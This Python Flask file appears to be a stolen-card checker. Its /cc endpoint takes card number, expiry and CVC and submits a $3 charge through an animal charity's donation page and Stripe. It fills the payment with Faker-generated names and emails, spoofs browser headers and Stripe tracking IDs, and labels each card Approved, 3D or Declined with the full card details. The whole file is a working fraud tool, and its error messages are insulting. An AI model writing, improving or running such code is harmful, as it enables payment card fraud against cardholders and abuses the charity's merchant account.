from flask import Flask, request, jsonify
import requests
import random
import re
import json
import time
from faker import Faker

app = Flask(__name__)
fake = Faker('en_GB')

def get_bin_info(bin):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin}", timeout=5)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

@app.route('/cc', methods=['GET'])
def check_cc():
    start_time = time.time()
    cc = request.args.get('cc')
    amount = "3"

    if not cc:
        return jsonify({"status": "error", "message": "Missing cc, you dumb fuck"}), 400

    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"status": "error", "message": "CC format should be number|month|year|cvc, asshole"}), 400

    card_number = parts[0].strip().replace(" ", "")
    exp_month = parts[1].strip()
    exp_year = parts[2].strip()
    cvc = parts[3].strip()
    exp_year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year
    bin = card_number[:6]

    email = fake.email()
    firstname = fake.first_name()
    lastname = fake.last_name()
    fullname = f"{firstname} {lastname}"

    session = requests.Session()

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "referer": "https://www.google.com/",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "cross-site",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }

    r1 = session.get("https://freeanimaldoctor.org/donate/?campaign=pepe-4", headers=headers)

    stripe_key = None
    ajax_url = None
    nonce = None
    campaign_id = None

    match = re.search(r'fadDonateData\s*=\s*({[^;]+})', r1.text)
    if match:
        data = json.loads(match.group(1))
        stripe_key = data.get("stripeKey")
        ajax_url = data.get("ajaxUrl")
        nonce = data.get("nonce")
        campaign_id = data.get("campaignId")

    if not nonce:
        elapsed = f"{time.time() - start_time:.2f} sec"
        bin_info = get_bin_info(bin)
        response = {
            "status": "error",
            "message": f"Declined | {card_number}|{exp_month}|{exp_year}|{cvc} | Nonce not found",
            "time": elapsed
        }
        if bin_info:
            response.update({
                "brand": bin_info.get("brand", "UNKNOWN"),
                "country_name": bin_info.get("country_name", "UNKNOWN"),
                "type": bin_info.get("type", "UNKNOWN")
            })
        return jsonify(response), 400

    stripe_mid = ""
    stripe_sid = ""
    for cookie in session.cookies:
        if cookie.name == "__stripe_mid":
            stripe_mid = cookie.value
        if cookie.name == "__stripe_sid":
            stripe_sid = cookie.value

    if not stripe_mid:
        stripe_mid = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
    if not stripe_sid:
        stripe_sid = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"

    ajax_headers = {
        "accept": "*/*",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://freeanimaldoctor.org",
        "referer": "https://freeanimaldoctor.org/donate/?campaign=pepe-4",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }

    ajax_data = {
        "action": "fad_create_payment_intent",
        "nonce": nonce,
        "amount": amount,
        "campaign_id": campaign_id
    }

    r2 = session.post(ajax_url, headers=ajax_headers, data=ajax_data)

    client_secret = None
    payment_intent_id = None
    try:
        result = r2.json()
        if result.get("success") and result.get("data"):
            client_secret = result["data"].get("clientSecret")
            payment_intent_id = result["data"].get("paymentIntentId")
    except:
        pass

    if not client_secret:
        elapsed = f"{time.time() - start_time:.2f} sec"
        bin_info = get_bin_info(bin)
        response = {
            "status": "error",
            "message": f"Declined | {card_number}|{exp_month}|{exp_year}|{cvc} | Client secret not found",
            "time": elapsed
        }
        if bin_info:
            response.update({
                "brand": bin_info.get("brand", "UNKNOWN"),
                "country_name": bin_info.get("country_name", "UNKNOWN"),
                "type": bin_info.get("type", "UNKNOWN")
            })
        return jsonify(response), 400

    guid = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
    session_id = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
    elements_session = f"elements_session_{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))}"
    config_id = f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"
    time_on_page = random.randint(100000, 500000)

    stripe_data = {
        "return_url": "https://freeanimaldoctor.org/donate/?campaign=pepe-4",
        "receipt_email": email,
        "payment_method_data[billing_details][name]": fullname,
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[billing_details][address][country]": "TR",
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_year]": exp_year_full,
        "payment_method_data[card][exp_month]": exp_month,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/c30beb05a2; stripe-js-v3/c30beb05a2; payment-element",
        "payment_method_data[referrer]": "https://freeanimaldoctor.org",
        "payment_method_data[time_on_page]": str(time_on_page),
        "payment_method_data[client_attribution_metadata][client_session_id]": session_id,
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
        "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
        "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
        "payment_method_data[client_attribution_metadata][elements_session_id]": elements_session,
        "payment_method_data[client_attribution_metadata][elements_session_config_id]": config_id,
        "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": stripe_mid,
        "payment_method_data[sid]": stripe_sid,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": stripe_key,
        "client_attribution_metadata[client_session_id]": session_id,
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "standard",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "client_attribution_metadata[elements_session_id]": elements_session,
        "client_attribution_metadata[elements_session_config_id]": config_id,
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "client_secret": client_secret
    }

    stripe_headers = {
        "accept": "application/json",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    }

    r3 = requests.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm",
                       headers=stripe_headers,
                       data=stripe_data)

    elapsed = f"{time.time() - start_time:.2f} sec"
    bin_info = get_bin_info(bin)

    try:
        result = r3.json()
        if result.get("status") == "succeeded":
            response = {
                "message": f"Approved | {card_number}|{exp_month}|{exp_year}|{cvc} | ${amount} Charged",
                "status": "success",
                "time": elapsed
            }
            if bin_info:
                response.update({
                    "brand": bin_info.get("brand", "UNKNOWN"),
                    "country_name": bin_info.get("country_name", "UNKNOWN"),
                    "type": bin_info.get("type", "UNKNOWN")
                })
            return jsonify(response), 200
        elif result.get("status") == "requires_action":
            response = {
                "message": f"3D | {card_number}|{exp_month}|{exp_year}|{cvc}",
                "status": "3d",
                "time": elapsed
            }
            if bin_info:
                response.update({
                    "brand": bin_info.get("brand", "UNKNOWN"),
                    "country_name": bin_info.get("country_name", "UNKNOWN"),
                    "type": bin_info.get("type", "UNKNOWN")
                })
            return jsonify(response), 200
        else:
            error_msg = result.get("error", {}).get("message", "Unknown error")
            decline_code = result.get("error", {}).get("decline_code", "")
            msg = f"{error_msg} ({decline_code})" if decline_code else error_msg
            response = {
                "message": f"Declined | {card_number}|{exp_month}|{exp_year}|{cvc} | {msg}",
                "status": "error",
                "time": elapsed
            }
            if bin_info:
                response.update({
                    "brand": bin_info.get("brand", "UNKNOWN"),
                    "country_name": bin_info.get("country_name", "UNKNOWN"),
                    "type": bin_info.get("type", "UNKNOWN")
                })
            return jsonify(response), 200
    except:
        response = {
            "message": f"Declined | {card_number}|{exp_month}|{exp_year}|{cvc} | Stripe error",
            "status": "error",
            "time": elapsed
        }
        if bin_info:
            response.update({
                "brand": bin_info.get("brand", "UNKNOWN"),
                "country_name": bin_info.get("country_name", "UNKNOWN"),
                "type": bin_info.get("type", "UNKNOWN")
            })
        return jsonify(response), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
